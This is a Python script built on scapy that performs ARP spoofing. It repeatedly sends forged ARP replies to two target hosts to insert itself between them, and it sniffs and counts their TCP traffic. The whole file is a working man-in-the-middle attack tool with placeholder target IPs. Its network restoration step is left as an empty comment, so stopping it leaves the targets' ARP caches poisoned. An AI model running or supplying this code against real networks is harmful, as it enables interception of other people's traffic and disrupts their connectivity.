from scapy.all import Ether, ARP, srp, send, sniff, conf
import time
import sys
import threading
from collections import defaultdict

class ARPSpoofer:
    def __init__(self, target1_ip, target2_ip, interface="eth0"):
        self.target1_ip = target1_ip
        self.target2_ip = target2_ip
        self.interface = interface
        conf.iface = interface
        self.packet_counts = defaultdict(int)
        self.running = True

    def verify_arp_tables(self, target_ip):
        """
        Verifies if our ARP spoofing is successful by checking the target's ARP table
        """
        # Send ARP who-has request
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip), 
                    timeout=2, verbose=False)
        if ans:
            return ans[0][1].hwsrc
        return None

    def monitor_traffic(self):
        """
        Monitors captured traffic to verify spoofing success
        """
        def packet_callback(pkt):
            if pkt.haslayer("TCP") and pkt.haslayer("IP"):
                if pkt["IP"].src == self.target1_ip or pkt["IP"].src == self.target2_ip:
                    self.packet_counts[pkt["IP"].src] += 1

        sniff(filter=f"host {self.target1_ip} or host {self.target2_ip}",
              prn=packet_callback, store=0)

    def print_status(self):
        """
        Prints periodic status updates
        """
        while self.running:
            print("\nTraffic Statistics:")
            for ip, count in self.packet_counts.items():
                print(f"Packets from {ip}: {count}")
            time.sleep(5)

    def run(self):
        try:
            # Start traffic monitoring
            monitor_thread = threading.Thread(target=self.monitor_traffic)
            monitor_thread.daemon = True
            monitor_thread.start()

            # Start status printing
            status_thread = threading.Thread(target=self.print_status)
            status_thread.daemon = True
            status_thread.start()

            print("[*] Starting ARP spoofing. Press CTRL+C to stop.")
            while True:
                # Verify ARP tables periodically
                target1_mac = self.verify_arp_tables(self.target1_ip)
                target2_mac = self.verify_arp_tables(self.target2_ip)

                if not target1_mac or not target2_mac:
                    print("[!] Failed to get target MAC addresses. Retrying...")
                    continue

                # Send ARP poison packets
                send(ARP(op=2, pdst=self.target1_ip, psrc=self.target2_ip,
                        hwdst=target1_mac), verbose=False)
                send(ARP(op=2, pdst=self.target2_ip, psrc=self.target1_ip,
                        hwdst=target2_mac), verbose=False)
                
                time.sleep(2)

        except KeyboardInterrupt:
            self.running = False
            print("\n[*] Stopping ARP spoof attack. Restoring network...")
            # Restoration code here...

if __name__ == "__main__":
    # Example usage
    spoofer = ARPSpoofer(
        target1_ip="172.18.0.20",  # Replace with your target IP
        target2_ip="172.18.0.9",   # Replace with your target IP
        interface="eth0"           # Replace with your interface
    )
    spoofer.run()